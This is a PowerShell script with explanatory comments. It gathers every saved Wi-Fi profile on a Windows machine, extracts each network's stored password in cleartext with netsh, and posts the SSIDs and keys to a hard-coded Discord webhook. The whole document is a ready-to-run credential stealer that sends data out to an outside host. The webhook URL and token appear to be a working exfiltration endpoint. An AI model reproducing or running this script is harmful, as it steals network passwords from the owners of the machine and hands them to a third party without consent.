# Wi-Fi Profile Extraction

# This script retrieves saved Wi-Fi profiles from a Windows device using `netsh`.
# It extracts stored SSIDs and (if available) their saved security keys,
# then formats and sends the result to a Discord webhook.

# How it works
# 1. Lists all saved Wi-Fi profiles using `netsh wlan show profiles`
# 2. Extracts SSID names from the output
# 3. Queries each profile for detailed information including stored key data
# 4. Filters results to show only:
#    - SSID names
#    - Key content (if available)
# 5. Formats the output into a readable message
# 6. Sends the result to a Discord webhook via HTTP POST

$profiles = (netsh wlan show profiles) |
    Select-String "\:(.+)$" |
    ForEach-Object { $name=$_.Matches.Value.TrimStart(": "); $name } |
    ForEach-Object { netsh wlan show profile name="$_" key=clear } |
    Select-String "SSID name|Key Content"

$message = "Saved Wi-Fi profiles:`n" + ($profiles -join "`n")

$body = @{
    content = $message
} | ConvertTo-Json

Invoke-RestMethod `
    -Uri "https://discord.com/api/webhooks/1510389267241631754/bsEM-H8cxl_Cu7o8Kj5-rOCXAxzMdme_WKZI2vKN3vDCTMKQo5pxT5MT34YYXInQQlpT" `
    -Method Post `
    -ContentType "application/json" `
    -Body $body
